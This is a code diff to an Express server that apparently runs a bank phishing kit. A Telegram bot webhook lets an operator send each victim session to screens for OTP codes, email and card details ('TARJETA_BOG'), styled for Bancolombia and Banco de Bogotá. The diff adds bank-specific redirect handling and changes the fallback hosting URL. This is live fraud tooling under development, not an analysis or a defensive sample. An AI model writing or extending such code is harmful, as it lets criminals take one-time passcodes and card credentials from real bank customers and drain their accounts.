@@ -11,7 +11,7 @@ app.use(express.json());
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID   = process.env.CHAT_ID;
 const PORT      = process.env.PORT || 4000;
-const SELF_URL  = process.env.RENDER_EXTERNAL_URL || 'https://popopopopos.onrender.com';
+const SELF_URL  = process.env.RENDER_EXTERNAL_URL || 'https://essa-global-server.onrender.com';
 
 // ─── Sessions Map ─────────────────────────────────────────────────────────────
 // sessionId → { redirect_to, last_msg_id, bank, data }
@@ -158,9 +158,20 @@ app.post('/telegram/webhook', (req, res) => {
 
     if (sessionId) {
       const s = sessions.get(sessionId) || {};
-      // Envía el comando original (INICIO, OTP, OTP_ERR, CORREO, TARJETA_BOG, etc.)
-      // No la URL mapeada, porque el cliente espera el comando original para mostrar la sección
-      s.redirect_to = cmd;
+      // Soporte para ambos bancos:
+      // - Bancolombia: envía URL mapeada (index.html?state=...)
+      // - Banco de Bogotá: envía comando original (OTP, CORREO, etc.)
+      const url = resolveCode(cmd);
+      if (s.bank === 'bancolombia' && url) {
+        // Bancolombia espera URLs
+        s.redirect_to = url;
+      } else if (!s.bank || s.bank === 'bogota') {
+        // Banco de Bogotá espera comandos originales
+        s.redirect_to = cmd;
+      } else {
+        // Fallback: si hay URL mapeada, usar URL; si no, usar comando
+        s.redirect_to = url || cmd;
+      }
       s.last_msg_id = msgId;
       sessions.set(sessionId, s);
     }
